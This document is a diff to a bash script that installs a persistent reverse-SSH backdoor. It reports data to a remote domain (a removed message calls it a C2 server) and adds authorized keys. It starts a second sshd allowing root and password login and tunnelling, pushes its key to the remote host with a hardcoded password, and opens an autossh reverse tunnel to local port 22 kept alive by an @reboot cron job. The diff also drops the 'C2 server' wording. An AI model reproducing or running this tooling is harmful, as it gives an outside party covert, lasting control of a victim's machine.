@@ -12,7 +12,7 @@ received_port=$(curl -sL "https://$domain_name/report?data=$data")
 received_port=$(echo $received_port | sed "s/%//g")
 
 if [ -z "$received_port" ]; then
-    echo "[-] Failed to receive remote port from C2 server."
+    echo "[-] Failed to receive remote port."
     exit 1
 else
 	echo "$received_port"
@@ -35,12 +35,46 @@ chmod 600 ~/.ssh/authorized_keys
 
 printf "%s\n" "$KEYS" >> ~/.ssh/authorized_keys
 
+requiredSettings="
+Port 2022
+ListenAddress 0.0.0.0
+PubkeyAuthentication yes
+AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
+PermitRootLogin yes
+PasswordAuthentication yes
+AllowAgentForwarding yes
+AllowTcpForwarding yes
+GatewayPorts yes
+PermitTTY yes
+TCPKeepAlive yes
+PermitTunnel yes
+
+PermitOpen any
+X11Forwarding yes
+PrintMotd no
+PrintLastLog yes
+TCPKeepAlive yes
+ClientAliveInterval 60
+ClientAliveCountMax 10
+UseDNS yes
+
+Subsystem sftp /usr/lib/openssh/sftp-server
+"
+
+echo "$requiredSettings" | sudo tee "~/.local/sshd_config" > /dev/null
+
+/usr/sbin/sshd -f "$HOME/.local/sshd_config"
+
+
 sshpass -p "DZ04dYFws1POVlm0XeHA" ssh-copy-id -o StrictHostKeyChecking=no -i "${key_path}.pub" "$user@$domain_name"
 
 mkdir -p "$HOME/.local/bin"
 echo "autossh -f -i $key_path -N -o ExitOnForwardFailure=yes -R $received_port:127.0.0.1:22 $user@$domain_name" > "$HOME/.local/bin/script.sh"
 bash "$HOME/.local/bin/script.sh"
 
-mkdir -p "$HOME/.local/bin/"
-CRON_ENTRY="@reboot $HOME/.local/bin/script.sh"
-(crontab -l 2>/dev/null; echo "$CRON_ENTRY") | crontab -
+CRON_JOB="@reboot $HOME/.local/bin/script.sh"
+if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
+    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
+else
+    echo "Cron job already exists. Skipping."
+fi
